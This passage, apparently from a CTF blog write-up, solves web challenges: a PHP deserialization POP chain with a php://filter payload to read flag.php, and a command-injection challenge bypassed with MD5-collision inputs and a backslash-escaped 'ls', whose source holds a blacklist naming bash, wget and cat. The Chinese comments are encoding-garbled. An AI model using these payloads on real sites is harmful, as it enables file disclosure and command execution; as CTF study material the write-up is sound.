<span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Welcome to '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">source</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token comment">//here</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//ç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³•</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">str</span><span class="token operator">-&gt;</span><span class="token property">source</span><span class="token punctuation">;</span><span class="token comment">//stræ— source</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//ååºåˆ—åŒ–ä¸€ä¸ªShowå®ä¾‹æ—¶ï¼Œä¼šè§¦å‘__wakeupæ–¹æ³•</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">//åœ¨preg_matchçš„æ—¶å€™ï¼Œä¼šå°†å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œè§¦å‘è¯¥å¯¹è±¡çš„__toStringæ–¹æ³•ã€‚</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//åœ¨å¯¹è±¡çš„å¤–éƒ¨è·å–ç§æœ‰æˆå‘˜å±æ€§çš„å€¼æ—¶è°ƒç”¨</span>
        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">p</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
Show<span class="token operator">.</span><span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span>Show<span class="token operator">.</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span>Test<span class="token operator">.</span><span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span>Modifier<span class="token operator">.</span><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span>Modifier<span class="token operator">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span>php
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span>
<span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">//Show.__wakeup()=&gt;Show.__toString()=&gt;Test.__get()=&gt;Modifier.__invoke()</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span>
<span class="token variable">$d</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">-&gt;</span><span class="token property">p</span><span class="token operator">=</span><span class="token variable">$d</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-&gt;</span><span class="token property">str</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">source</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//O:4:"Show":2:{s:6:"source";O:4:"Show":2:{s:6:"source";N;s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:6:" * var";s:8:"flag.php";}}}s:3:"str";N;}</span>
<span class="token comment">//O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>åœ¨urlencodeå‡½æ•°ä¸­ï¼Œæ˜Ÿå·*ä¸è¢«ç¼–ç </p>
</blockquote>
<p>æ‰€ä»¥å°±ä¸ç”¨åˆ é™¤/åŠ %00äº†~</p>
<p>ä½†è¾“å…¥åçœ‹ä¸è§ï¼ˆ</p>
<p>äºæ˜¯ç”¨ä¼ªåè®®</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/convert.base64-encode/resource=flag.php'</span><span class="token punctuation">;</span>

 <span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Show"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"source"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Show"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"source"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"str"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"p"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Modifier"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">" * var"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">52</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"php://filter/convert.base64-encode/resource=flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"str"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span><span class="token punctuation">}</span>

<span class="token operator">?</span>pop<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Show<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>source<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Show<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>source<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>str<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Test<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>p<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Modifier<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>var<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A52<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>php<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>Ffilter<span class="token operator">%</span><span class="token number">2</span>Fconvert<span class="token operator">.</span>base64<span class="token operator">-</span>encode<span class="token operator">%</span><span class="token number">2</span>Fresource<span class="token operator">%</span><span class="token number">3</span>Dflag<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>str<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/7daeda834e136fa2042cb8cc7c5fc444.png"></p>
<hr>
<h3 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/5a796ce1b04782f2d17aeb67a0e34a98.png"></p>
<p>æœ‰ä¸ªcmd</p>
<p><code>;"()</code>ç­‰è¢«forbidäº†ï¼ˆ</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/d02ca9ba5d6a9730b575650cd51a3fc4.png"></p>
<pre class="line-numbers language-none"><code class="language-none">flag.php
TmpZMll6WXhOamN5WlRjd05qZzNNQT09<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>17å¼ ç‰Œä½ èƒ½ç§’æˆ‘ï¼Ÿï¼ˆ</p>
<pre class="line-numbers language-none"><code class="language-none">index.php
TmprMlpUWTBOalUzT0RKbE56QTJPRGN3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span>php
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token class-name">E_ALL</span> <span class="token operator">||</span> <span class="token operator">~</span> <span class="token constant">E_NOTICE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[^a-zA-Z0-9.]+/"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿‡æ»¤äº†æ‰€æœ‰éå­—æ¯æ•°å­—å’Œç‚¹å·</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src ="./ctf3.jpeg"&gt;'</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"xixiï½ no flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src='data:image/gif;base64,"</span> <span class="token operator">.</span> <span class="token variable">$txt</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"'&gt;&lt;/img&gt;"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">echo</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&lt;|&gt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"forbid ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`$cmd`</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"md5 is funny ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>style<span class="token operator">&gt;</span>
  body<span class="token punctuation">{</span>
   background<span class="token punctuation">:</span><span class="token function">url</span><span class="token punctuation">(</span><span class="token operator">.</span><span class="token operator">/</span>bj<span class="token operator">.</span>png<span class="token punctuation">)</span>  no<span class="token operator">-</span>repeat center center<span class="token punctuation">;</span>
   background<span class="token operator">-</span>size<span class="token punctuation">:</span>cover<span class="token punctuation">;</span>
   background<span class="token operator">-</span>attachment<span class="token punctuation">:</span>fixed<span class="token punctuation">;</span>
   background<span class="token operator">-</span>color<span class="token punctuation">:</span><span class="token comment">#CCCCCC;</span>
<span class="token punctuation">}</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>style<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">(string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>é—®ä¸€ä¸‹å°é²¸é±¼ï¼ˆ</p>
<pre class="line-numbers language-none"><code class="language-none">$a = hex2bin('4dc968ff0ee20c95a107d9d9b7266d1edf769e0b166a237eaa6e7a75df06a0b916fca50eaa417218e8fec75d2d69bb1ee5a758a2ce5b0d5a61f9c735c5ac355');
$b = hex2bin('4dc968ff0ee20c95a107d9d9b7266d1edf769e0b166a237eaa6e7a75df06a0b916fca50eaa417218e8fec75d2d69bb1ee5a758a2ce5b0d5a61f9c735c5ac355');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>è¿™ä¸¤ä¸ªäºŒè¿›åˆ¶æ•°æ®ä¸åŒï¼Œä½†å®ƒä»¬çš„ MD5 å“ˆå¸Œå€¼ç›¸åŒï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>l\s /</code></p>
<p>æˆ–è€…ç”¨dirä¹Ÿè¡Œ<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41905135/article/details/124881754">Windowsç³»ç»Ÿå‘½ä»¤dirä½¿ç”¨è¯¦è§£_dirå‘½ä»¤-CSDNåšå®¢</a></p>
<p><code>dir /</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/c70091c4c72ff7682b768c9e80aa5b7a.png"></p>
<hr>
<h3 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">  <span class="token keyword">function</span> <span class="token function-definition function">enc</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">{</span>
      hash <span class="token operator">=</span> <span class="token function">hex_md5</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> hash<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function-definition function">validate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token keyword">var</span> code <span class="token operator">=</span> document<span class="token operator">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"vcode"</span><span class="token punctuation">)</span><span class="token operator">.</span>value<span class="token punctuation">;</span>
<span class="token comment">//document æ˜¯ JavaScript ä¸­è¡¨ç¤ºæ•´ä¸ª HTML æ–‡æ¡£çš„å¯¹è±¡ï¼Œé€šè¿‡å®ƒå¯ä»¥è®¿é—®å’Œæ“ä½œ HTML æ–‡æ¡£ä¸­çš„å„ç§å…ƒç´ ã€‚</span>
<span class="token comment">//getElementById() æ˜¯ document å¯¹è±¡çš„ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºæ ¹æ®å…ƒç´ çš„ id å±æ€§æ¥æŸ¥æ‰¾å¹¶è¿”å›å¯¹åº”çš„å…ƒç´ ã€‚</span>
